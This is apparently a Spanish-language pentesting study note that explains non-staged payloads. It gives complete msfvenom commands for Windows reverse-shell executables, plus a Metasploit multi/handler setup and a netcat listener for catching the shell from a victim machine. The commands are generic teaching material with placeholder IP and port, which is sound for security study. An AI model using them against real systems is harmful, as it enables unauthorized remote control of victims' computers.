___

- Tags: #enumeración  #payload-non-staged #metasploit 

---
# Introducción

En el ámbito de la ciberseguridad y las pruebas de penetración, un "**Payload Non-Staged**" se refiere a un tipo de carga útil maliciosa que se presenta como un bloque único y completo. A diferencia de los [[Payload Staged|payloads staged]], no hay una división en etapas distintas; en su lugar, toda la funcionalidad maliciosa se encuentra en un solo fragmento de código. Este enfoque tiene características específicas que pueden ser beneficiosas en ciertos escenarios.

____
# Características del Payload Non-Staged

1. **Ejecución Instantánea:**

   - Dado que toda la carga útil se encuentra en un solo bloque de código, la ejecución es instantánea una vez que se activa. No hay necesidad de establecer una conexión inicial para descargar una segunda etapa.

2. **Simplicidad:**
   
   - Los **payloads non-staged** son más simples en términos de implementación. No requieren la configuración de una estructura de dos etapas y son más fáciles de entender y modificar.

3. **Detección Potencial:**
   
   - Aunque la simplicidad puede ser una ventaja, también puede ser una desventaja en términos de detección. Al tratarse de un único bloque de código, puede ser más fácilmente detectado por soluciones de seguridad.

___
# Ejemplos de Payload Non-Staged

```bash 
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=ip LPORT=puerto -f exe -o nombre.exe
```

Este comando se utiliza para crear un archivo ejecutable (.exe) que, al ejecutarse, establece una conexión de [[reverse shell]] hacia una dirección [[Dirección IP|IP]] y puerto específicos.

```bash 
msfdb run
```

Este comando inicia el entorno de [[Metasploit Framework]].

```bash 
use exploit/multi/handler
```

Aquí seleccionamos el exploit que se va a utilizar.

```bash 
set payload windows/x64/meterpreter_reverse_tcp
```

Se especifica el payload que se utilizará.

```bash 
set LHOST ip
set LPORT puerto
```

Se establece la dirección [[Dirección IP|IP]] y el puerto del atacante.

```bash 
run 
```

Con este comando, se inicia el listener para esperar la conexión de la [[reverse shell]].

Al ejecutar el archivo .exe en la máquina víctima, se establecerá una conexión y se obtendrá acceso a toda la PC de la víctima.

También es posible lograr esto utilizando [[Netcat]]:

```bash 
msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=ip LPORT=puerto -f exe -o nombre.exe
```

Este comando crea un archivo .exe que, al ejecutarse, establece una conexión de [[reverse shell]] hacia una dirección [[Dirección IP|IP]] y puerto específicos.

```bash 
nc -lvp puerto
```

Al ejecutar el .exe y tener [[Netcat]] en escucha en la máquina atacante, se recibirá una [[reverse shell]] de la máquina víctima.
___

# Consideraciones y Conclusión

Aunque los **payloads non-staged** tienen sus ventajas, es importante considerar el contexto y los objetivos específicos de un ataque. La elección entre un [[payload staged]] y **non-staged** dependerá de la situación y de la necesidad de evadir sistemas de detección.
